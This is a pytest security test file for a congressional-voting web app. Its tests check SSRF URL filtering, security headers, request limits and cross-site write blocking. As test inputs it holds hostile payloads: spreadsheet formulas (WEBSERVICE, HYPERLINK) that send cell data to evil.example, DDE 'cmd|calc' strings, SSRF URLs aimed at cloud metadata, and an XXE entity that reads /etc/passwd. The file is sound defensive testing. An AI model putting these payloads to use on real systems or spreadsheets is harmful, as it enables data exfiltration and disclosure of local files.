import asyncio
import json
import re
import threading
import time
import pytest
from unittest.mock import MagicMock, patch
from pathlib import Path
from defusedxml.common import EntitiesForbidden
from httpx import AsyncClient, ASGITransport
from app.main import app, ForwardedProtoMiddleware, MAX_BODY_BYTES
from app.routers.bills import _is_safe_url
from app.routers.feedback import FeedbackSubmission
from app.routers.notify import NotifySignup
from app.services.sheets import SheetsService
from app.services.senate_votes import parse_senate_vote_xml

FIXTURES = Path(__file__).parent / "fixtures" / "synced"
STATIC = Path(__file__).parent.parent / "static"


def _patch_data_dir():
    return patch("app.dependencies.get_data_dir", return_value=FIXTURES)


def _clear_data_service_cache():
    from app.dependencies import get_data_service
    get_data_service.cache_clear()


# --- SSRF URL Validation ---

def test_safe_url_accepts_congress_gov():
    assert _is_safe_url("https://www.congress.gov/bill/119/hr/1/text") is True
    assert _is_safe_url("https://congress.gov/some/path") is True
    assert _is_safe_url("https://api.congress.gov/v3/bill") is True


def test_safe_url_rejects_other_domains():
    assert _is_safe_url("https://evil.com/payload") is False
    assert _is_safe_url("https://169.254.169.254/latest/meta-data") is False
    assert _is_safe_url("https://localhost:8080/internal") is False


def test_safe_url_rejects_http_scheme():
    assert _is_safe_url("http://www.congress.gov/bill") is False


def test_safe_url_rejects_username_bypass():
    assert _is_safe_url("https://congress.gov@evil.com/payload") is False
    assert _is_safe_url("https://user:pass@www.congress.gov/bill") is False


def test_safe_url_rejects_empty_and_malformed():
    assert _is_safe_url("") is False
    assert _is_safe_url("not-a-url") is False
    assert _is_safe_url("ftp://congress.gov/file") is False


# --- Input Validation ---

@pytest.mark.asyncio
async def test_invalid_bill_type_returns_400():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/bills/119/faketype/1")
    assert resp.status_code == 400
    assert "Invalid bill type" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_valid_bill_types_accepted():
    with _patch_data_dir():
        _clear_data_service_cache()
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            for bt in ["hr", "s", "hjres", "sjres", "HR", "S"]:
                resp = await client.get(f"/api/bills/119/{bt}/1")
                assert resp.status_code != 400, f"Bill type '{bt}' should be accepted"

    _clear_data_service_cache()


@pytest.mark.asyncio
async def test_invalid_bioguide_id_returns_400():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/members/detail/INVALID")
    assert resp.status_code == 400
    assert "Invalid member ID" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_valid_bioguide_id_accepted():
    with _patch_data_dir():
        _clear_data_service_cache()
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/api/members/detail/S001217")

    _clear_data_service_cache()
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_non_alpha_state_code_returns_400():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/members/!!/overview")
    assert resp.status_code == 400
    assert "2 letters" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_numeric_state_code_returns_400():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/members/12/overview")
    assert resp.status_code == 400


@pytest.mark.asyncio
async def test_congress_out_of_range_returns_422():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/bills/999/hr/1")
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_error_messages_are_generic():
    """Error responses should not leak internal exception details."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/bills/119/xxx/1")
    detail = resp.json()["detail"]
    assert "traceback" not in detail.lower()
    assert "exception" not in detail.lower()


# --- Security Headers ---

@pytest.mark.asyncio
async def test_security_headers_present():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/health")

    assert resp.headers["X-Content-Type-Options"] == "nosniff"
    assert resp.headers["X-Frame-Options"] == "DENY"
    assert resp.headers["Referrer-Policy"] == "strict-origin-when-cross-origin"
    assert "camera=()" in resp.headers["Permissions-Policy"]
    assert "default-src 'self'" in resp.headers["Content-Security-Policy"]


@pytest.mark.asyncio
async def test_csp_allows_only_self_hosted_fonts_and_styles():
    with _patch_data_dir():
        _clear_data_service_cache()
        transport = ASGITransport(app=app)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.get("/")
    _clear_data_service_cache()
    csp = resp.headers["Content-Security-Policy"]
    assert "googleapis" not in csp
    assert "gstatic" not in csp
    assert "style-src 'self' 'unsafe-inline';" in csp
    assert "font-src 'self';" in csp
    assert "img-src 'self' https://www.congress.gov;" in csp
    assert "script-src 'self';" in csp


# Every response type carries the same headers (F086). The values are written out here, not
# imported from app.main, so a weakened or path-dependent policy fails.
EXPECTED_SECURITY_HEADERS = {
    "content-security-policy": (
        "default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; "
        "img-src 'self' https://www.congress.gov; script-src 'self'; connect-src 'self'; "
        "base-uri 'none'; form-action 'self'; object-src 'none'; frame-ancestors 'none'"
    ),
    "x-content-type-options": "nosniff",
    "x-frame-options": "DENY",
    "referrer-policy": "strict-origin-when-cross-origin",
    "permissions-policy": "camera=(), microphone=(), geolocation=()",
    "strict-transport-security": "max-age=86400",
}


async def _response_of_type(client, case):
    if case == "413":
        return await client.post("/api/feedback", content=b"{" + b" " * MAX_BODY_BYTES + b"}",
                                  headers={"content-type": "application/json"})
    if case == "429":
        for _ in range(80):
            response = await client.get("/api/districts/11570")
            if response.status_code == 429:
                return response
        raise AssertionError("the 60/minute limit on /api/districts should trip within 80 calls")
    if case == "500":
        with patch("app.services.data_service.DataService.get_sync_metadata",
                   side_effect=RuntimeError("boom")):
            return await client.get("/sitemap.xml")
    method, path = case.split(" ", 1)
    return await client.request(method, path)


@pytest.mark.asyncio
@pytest.mark.parametrize("case,status", [
    ("GET /", 200), ("GET /about", 200), ("GET /methodology", 200), ("GET /privacy", 200),
    ("GET /state?code=NY", 200), ("GET /member?id=S000148", 200),
    ("GET /bill?congress=119&type=hr&number=1", 200),
    ("GET /api/health", 200), ("GET /api/bills/119/hr/1", 200),
    ("GET /state?zip=11570", 302), ("GET /about/", 307),
    ("GET /no-such-page", 404), ("GET /api/no-such-endpoint", 404),
    ("POST /about", 405), ("GET /api/bills/999/hr/1", 422),
    ("413", 413), ("429", 429), ("500", 500),
    ("GET /static/js/site.js?v=1", 200), ("GET /static/css/site.css?v=1", 200),
    ("GET /static/fonts/inter-400.woff2", 200), ("GET /static/bill.html", 200),
    ("GET /favicon.ico", 200), ("GET /sitemap.xml", 200), ("GET /robots.txt", 200),
])
async def test_every_response_type_carries_the_security_headers(case, status):
    with _patch_data_dir():
        _clear_data_service_cache()
        transport = ASGITransport(app=app, raise_app_exceptions=False)
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            response = await _response_of_type(client, case)
    _clear_data_service_cache()
    assert response.status_code == status
    for name, value in EXPECTED_SECURITY_HEADERS.items():
        assert response.headers.get(name) == value, name


# --- The visitor's scheme behind the proxy (F038) ---

@pytest.mark.asyncio
@pytest.mark.parametrize("forwarded,location", [
    ({"X-Forwarded-Proto": "https"}, "https://test/about"),
    ({"X-Forwarded-Proto": "http"}, "http://test/about"),
    ({}, "http://test/about"),
])
async def test_trailing_slash_redirect_keeps_the_visitors_scheme(forwarded, location):
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/about/", headers=forwarded)
    assert resp.status_code == 307
    assert resp.headers["location"] == location


@pytest.mark.asyncio
@pytest.mark.parametrize("headers,scheme", [
    ([(b"x-forwarded-proto", b"https")], "https"),
    ([(b"x-forwarded-proto", b" HTTPS ")], "https"),
    ([(b"x-forwarded-proto", b"http, https")], "https"),
    ([(b"x-forwarded-proto", b"https"), (b"x-forwarded-proto", b"http")], "http"),
    ([(b"x-forwarded-proto", b"javascript")], "http"),
    ([], "http"),
])
async def test_forwarded_proto_sets_only_the_scheme(headers, scheme):
    """Only the scheme changes: the socket peer, which limiter.client_key falls back to,
    stays the peer whatever X-Forwarded-For says."""
    seen = {}

    async def inner(scope, receive, send):
        seen.update(scope)

    peer = ("10.0.0.1", 50000)
    scope = {"type": "http", "scheme": "http", "client": peer,
             "headers": headers + [(b"x-forwarded-for", b"198.51.100.1, garbage")]}
    await ForwardedProtoMiddleware(inner)(scope, None, None)
    assert seen["scheme"] == scheme
    assert seen["client"] == peer


@pytest.mark.asyncio
async def test_woff2_is_served_as_a_font_cached_for_a_day():
    """Unversioned files are cached for a day, not a year: no ?v= change can refresh them (F008)."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/static/fonts/inter-400.woff2")
    assert resp.status_code == 200
    assert resp.headers["content-type"] == "font/woff2"
    assert resp.headers["cache-control"] == "public, max-age=86400"


@pytest.mark.asyncio
async def test_swagger_and_openapi_disabled():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        docs = await client.get("/docs")
        redoc = await client.get("/redoc")
        openapi = await client.get("/openapi.json")

    assert docs.status_code == 404
    assert redoc.status_code == 404
    assert openapi.status_code == 404


@pytest.mark.asyncio
async def test_health_no_demo_mode_leak():
    """Health endpoint should not reveal whether API keys are configured."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/health")
    data = resp.json()
    assert "demo_mode" not in data
    assert data["status"] == "ok"


# --- Write routes: body cap, JSON from the site only, no echo (F004, F036) ---

FEEDBACK = {"message": "Great tool!", "page_url": "http://test/", "page_type": "home",
            "context_id": "", "context_label": ""}
NOTIFY = {"email": "voter@example.com", "state": "OH"}
WRITES = [("/api/feedback", FEEDBACK), ("/api/notify", NOTIFY)]


@pytest.fixture
def stored(tmp_path):
    """Both write routes store to temp files with Sheets off; yields a reader of what landed."""
    sheets = MagicMock()
    sheets.is_available = False
    files = {"/api/feedback": tmp_path / "feedback.jsonl", "/api/notify": tmp_path / "notify.jsonl"}
    with patch("app.routers.feedback.FEEDBACK_FILE", files["/api/feedback"]), \
         patch("app.routers.notify.NOTIFY_FILE", files["/api/notify"]), \
         patch("app.routers.feedback._sheets", sheets), \
         patch("app.routers.notify._sheets", sheets):
        yield lambda path: files[path].read_text().splitlines() if files[path].exists() else []


async def _post(path, **kwargs):
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        return await client.post(path, **kwargs)


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload", WRITES)
async def test_body_over_the_cap_is_refused_unread(stored, path, payload):
    body = json.dumps({**payload, "padding": "A" * MAX_BODY_BYTES}).encode()
    resp = await _post(path, content=body, headers={"content-type": "application/json"})
    assert resp.status_code == 413
    assert resp.headers["cache-control"] == "no-store"
    assert resp.json() == {"detail": "Request body too large"}
    assert stored(path) == []


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload", WRITES)
@pytest.mark.parametrize("headers", [{}, {"content-length": "64"}], ids=["chunked", "lying-length"])
async def test_streamed_body_over_the_cap_is_cut_off(stored, path, payload, headers):
    """A chunked body, or one longer than its Content-Length, is stopped at the cap."""
    pulled = 0

    async def chunks():
        nonlocal pulled
        for _ in range(16):
            pulled += 1
            yield b"A" * 65536

    resp = await _post(path, content=chunks(), headers={"content-type": "application/json", **headers})
    assert resp.status_code == 413
    assert resp.headers["cache-control"] == "no-store"
    assert resp.json() == {"detail": "Request body too large"}
    assert pulled == 1
    assert stored(path) == []


@pytest.mark.asyncio
async def test_largest_real_feedback_fits_under_the_cap(stored):
    """2000 non-Latin characters, every one escaped, plus full-length URL and labels: ~16 KB."""
    payload = {"message": "選" * 2000, "page_url": "http://test/" + "a" * 488, "page_type": "b" * 50,
               "context_id": "c" * 200, "context_label": "議" * 500}
    body = json.dumps(payload).encode()
    assert 15_000 < len(body) < MAX_BODY_BYTES
    resp = await _post("/api/feedback", content=body, headers={"content-type": "application/json"})
    assert resp.status_code == 200
    assert len(stored("/api/feedback")) == 1


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload", WRITES)
@pytest.mark.parametrize("content_type", [None, "", "text/plain", "application/x-www-form-urlencoded"])
async def test_write_routes_take_only_json(stored, path, payload, content_type):
    headers = {} if content_type is None else {"content-type": content_type}
    resp = await _post(path, content=json.dumps(payload).encode(), headers=headers)
    assert resp.status_code == 415
    assert resp.headers["cache-control"] == "no-store"
    assert stored(path) == []


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload", WRITES)
@pytest.mark.parametrize("headers", [
    {"origin": "https://evil.example"},
    {"origin": "null"},
    {"origin": "http://localhost.evil.example"},
    {"origin": "https://clearvoting.org.evil.example"},
    {"sec-fetch-site": "cross-site"},
    {"origin": "https://clearvoting.org", "sec-fetch-site": "cross-site"},
])
async def test_cross_site_writes_are_refused(stored, path, payload, headers):
    resp = await _post(path, json=payload, headers=headers)
    assert resp.status_code == 403
    assert resp.headers["cache-control"] == "no-store"
    assert stored(path) == []


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload", WRITES)
@pytest.mark.parametrize("headers", [
    {},
    {"origin": "https://clearvoting.org", "sec-fetch-site": "same-origin"},
    {"origin": "https://www.clearvoting.org", "sec-fetch-site": "same-origin"},
    {"origin": "http://localhost:8000", "sec-fetch-site": "same-origin"},
    {"origin": "http://127.0.0.1:8000"},
    {"content-type": "application/json; charset=utf-8"},
])
async def test_same_site_json_writes_still_succeed(stored, path, payload, headers):
    resp = await _post(path, content=json.dumps(payload).encode(),
                       headers={"content-type": "application/json", **headers})
    assert resp.status_code == 200
    assert resp.json() == {"status": "ok"}
    assert len(stored(path)) == 1


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload,bad", [
    ("/api/feedback", FEEDBACK, {"message": "SECRET-" + "x" * 2001}),
    ("/api/feedback", FEEDBACK, {"SECRET-field": "SECRET-value"}),
    ("/api/notify", NOTIFY, {"email": "SECRET-not-an-email"}),
    ("/api/notify", NOTIFY, {"SECRET-field": "SECRET-value"}),
])
async def test_422_names_the_field_without_echoing_the_input(stored, path, payload, bad):
    resp = await _post(path, json={**payload, **bad})
    assert resp.status_code == 422
    assert resp.headers["cache-control"] == "no-store"
    assert "SECRET-value" not in resp.text and "SECRET-x" not in resp.text
    assert "SECRET-not-an-email" not in resp.text
    for error in resp.json()["detail"]:
        assert set(error) == {"loc", "msg", "type"}
    assert stored(path) == []


@pytest.mark.parametrize("js,path,model", [
    ("feedback.js", "/api/feedback", FeedbackSubmission),
    ("site.js", "/api/notify", NotifySignup),
])
def test_site_js_posts_json_with_declared_fields_only(js, path, model):
    """415 and extra='forbid' must never refuse the site's own forms."""
    source = (STATIC / "js" / js).read_text()
    call = re.search(rf"fetch\('{path}',\s*\{{(?P<opts>.*?)JSON\.stringify\(\{{(?P<body>.*?)\}}\)", source, re.S)
    assert call, f"{js} no longer posts to {path}"
    assert "headers: { 'Content-Type': 'application/json' }" in call["opts"]
    sent = {part.split(":")[0].strip() for part in call["body"].split(",") if part.strip()}
    assert sent and sent <= set(model.model_fields)


# --- Write routes: Google Sheets off the event loop, retried, formula-safe (F005, F031, F046, F085) ---

def _router(path):
    return "app.routers." + path.removeprefix("/api/")


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload", WRITES)
@pytest.mark.parametrize("slow", ["sheets", "fallback-file"])
async def test_a_slow_write_does_not_stall_other_requests(stored, path, payload, slow):
    """A 0.5 s Sheets call or file write runs in the threadpool: a GET sent meanwhile is answered at once."""
    started, finished = threading.Event(), threading.Event()

    def slow_write(_):
        started.set()
        time.sleep(0.5)
        finished.set()
        return True

    if slow == "sheets":
        sheets = MagicMock()
        sheets.is_available = True
        sheets.append_row.side_effect = slow_write
        writer = patch(f"{_router(path)}._sheets", sheets)
    else:  # Sheets is off (the stored fixture), so the row goes to the file
        writer = patch(f"{_router(path)}._save_to_file", slow_write)
    with writer:
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            post = asyncio.create_task(client.post(path, json=payload))
            for _ in range(300):
                if started.is_set():
                    break
                await asyncio.sleep(0.01)
            assert started.is_set()
            sent = time.perf_counter()
            resp = await client.get("/robots.txt")
            waited = time.perf_counter() - sent
            answered_mid_write = not finished.is_set()
            assert (await post).status_code == 200
    assert resp.status_code == 200
    assert answered_mid_write, "the GET waited for the write: it ran on the event loop"
    assert waited < 0.2


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload,cells", [
    ("/api/feedback",
     {"message": "=1+1", "page_url": '=WEBSERVICE("http://evil.example/?"&B2)', "page_type": "@x",
      "context_id": "+1", "context_label": " -1"},
     ["'=1+1", '\'=WEBSERVICE("http://evil.example/?"&B2)', "'@x", "'+1", "' -1"]),
    ("/api/notify", {"email": '=HYPERLINK("http://evil.example/?"&B3&"@a.co","Click")', "state": "OH"},
     ['\'=HYPERLINK("http://evil.example/?"&B3&"@a.co","Click")', "OH"]),
    ("/api/notify", {"email": "+cmd|calc!A0@x.co", "state": "OH"}, ["'+cmd|calc!A0@x.co", "OH"]),
    ("/api/notify", {"email": "-2+3+cmd|calc!A0@x.co", "state": "OH"}, ["'-2+3+cmd|calc!A0@x.co", "OH"]),
])
async def test_formula_payloads_reach_the_sheet_as_text(stored, path, payload, cells):
    """Through the real SheetsService: every formula cell gets an apostrophe and RAW is passed."""
    sheets = SheetsService("", "")
    sheets._worksheet = MagicMock()
    with patch(f"{_router(path)}._sheets", sheets):
        resp = await _post(path, json=payload)
    assert resp.status_code == 200
    (row,), options = sheets._worksheet.append_row.call_args
    assert options == {"value_input_option": "RAW"}
    assert row[0][:2] == "20" and row[1:] == cells  # the timestamp is untouched
    assert stored(path) == []


@pytest.mark.asyncio
@pytest.mark.parametrize("path,payload", WRITES)
async def test_sheets_failed_at_boot_is_retried_by_the_route(stored, path, payload):
    """A Google blip at boot: writes fall back for a minute, then the route itself reconnects (F031)."""
    worksheet = MagicMock()
    worksheet.row_values.return_value = ["Timestamp"]
    gspread = MagicMock()
    gspread.WorksheetNotFound = type("WorksheetNotFound", (Exception,), {})
    client = gspread.service_account_from_dict.return_value
    client.open_by_key.return_value.sheet1 = worksheet
    client.open_by_key.return_value.worksheet.return_value = worksheet
    client.open_by_key.side_effect = [Exception("503"), client.open_by_key.return_value]
    clock = MagicMock()
    clock.monotonic.return_value = 1000.0

    with patch.dict("sys.modules", {"gspread": gspread}), \
         patch("app.services.sheets.time", clock):
        sheets = SheetsService('{"type":"service_account"}', "sheet-123", worksheet_title=(
            "Notify Signups" if path == "/api/notify" else None))
        with patch(f"{_router(path)}._sheets", sheets):
            clock.monotonic.return_value = 1030.0
            assert (await _post(path, json=payload)).status_code == 200
            assert len(stored(path)) == 1 and client.open_by_key.call_count == 1

            clock.monotonic.return_value = 1060.0
            assert (await _post(path, json=payload)).status_code == 200

    assert client.open_by_key.call_count == 2
    worksheet.append_row.assert_called_once()
    assert len(stored(path)) == 1  # the second write reached Sheets, not the file


# --- XML Safety ---

def test_xxe_payload_blocked():
    """defusedxml should block XML External Entity attacks."""
    xxe_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<roll_call_vote>
  <congress>119</congress>
  <session>2</session>
  <vote_number>1</vote_number>
  <vote_date>2026-01-01</vote_date>
  <vote_question_text>&xxe;</vote_question_text>
  <vote_document_text>Test</vote_document_text>
  <vote_result_text>Passed</vote_result_text>
  <vote_title>Test</vote_title>
  <count><yeas>50</yeas><nays>49</nays><present>0</present><absent>1</absent></count>
  <members></members>
</roll_call_vote>"""

    with pytest.raises(EntitiesForbidden):
        parse_senate_vote_xml(xxe_xml)
